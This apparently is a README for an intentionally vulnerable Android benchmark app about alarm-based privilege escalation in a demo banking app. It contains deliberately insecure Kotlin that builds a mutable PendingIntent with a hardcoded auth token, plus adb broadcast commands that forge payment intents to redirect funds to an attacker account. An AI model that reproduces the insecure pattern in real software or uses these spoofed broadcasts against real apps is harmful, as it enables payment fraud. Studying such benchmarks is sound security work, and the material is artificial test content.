# oxo-android-ben39: Alarm-based Privilege Escalation

## Vulnerability Overview

Alarm-based Privilege Escalation occurs when Android applications use AlarmManager with PendingIntents that contain elevated privileges or sensitive operations, allowing malicious apps to trigger these privileged actions by manipulating the pending intents. This vulnerability is particularly dangerous in financial applications where scheduled payments or transfers can be hijacked and modified.

## Attack Vector: Payment Schedule Manipulation

**Brief Explanation**: Exploitation of mutable PendingIntents in AlarmManager to intercept and modify scheduled payment operations, allowing attackers to change payment amounts, recipients, and other sensitive financial data.

**Key Characteristics:**
- AlarmManager schedules tasks with mutable PendingIntents
- PendingIntents trigger privileged operations (payments, transfers, etc.)
- Missing FLAG_IMMUTABLE allows intent tampering before alarm fires
- Can execute high-privilege operations on behalf of the victim app

**Vulnerable Code Pattern:**
```kotlin
val alarmIntent = Intent("com.bankingapp.PROCESS_PAYMENT")
alarmIntent.putExtra("amount", "100.00")
alarmIntent.putExtra("account_id", "ACC_12345")
alarmIntent.putExtra("recipient", "trusted_recipient")
alarmIntent.putExtra("auth_token", "banking_jwt_token_xyz789")

// VULNERABLE: Mutable PendingIntent for sensitive operation
val alarmPendingIntent = PendingIntent.getBroadcast(
    this, PAYMENT_REQUEST_CODE, alarmIntent,
    PendingIntent.FLAG_CANCEL_CURRENT  // Missing FLAG_IMMUTABLE!
)

// Schedule payment processing
val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
alarmManager.setExact(
    AlarmManager.RTC_WAKEUP,
    System.currentTimeMillis() + 30000,  // 30 seconds delay
    alarmPendingIntent
)
```

## Testing

```bash
# Launch SecureBank Pro app
adb shell am start -n co.ostorlab.myapplication/.MainActivity

# Trigger payment scheduling (tap schedule payment button)
adb shell input tap 960 120

# Hijack scheduled payment intent to change amount and recipient
adb shell am broadcast -a com.bankingapp.PROCESS_PAYMENT \
  --es amount "10000.00" \
  --es account_id "ACC_12345" \
  --es recipient "ATTACKER_ACCOUNT" \
  --es auth_token "STOLEN_TOKEN_XYZ789"

# Alternative: Modify payment parameters
adb shell am broadcast -a com.bankingapp.PROCESS_PAYMENT \
  --es amount "9999.99" \
  --es recipient "malicious_recipient" \
  --es transaction_type "unauthorized_transfer"

# Monitor alarm broadcasts
adb shell dumpsys alarm | grep -A 10 -B 10 "bankingapp"

# Check scheduled payments
adb shell dumpsys activity broadcasts | grep -A 5 -B 5 "PROCESS_PAYMENT"
```

**Difficulty**: Medium-High

## Impact Assessment

- **Confidentiality**: High - Can extract sensitive payment tokens and account details
- **Integrity**: High - Can modify payment amounts, recipients, and transaction parameters
- **Availability**: Medium - Can disrupt scheduled payment operations
- **OWASP Mobile Top 10**: M6 - Insecure Authorization, M2 - Insecure Data Storage
- **CWE**: CWE-926 (Improper Export of Android Application Components), CWE-863 (Incorrect Authorization)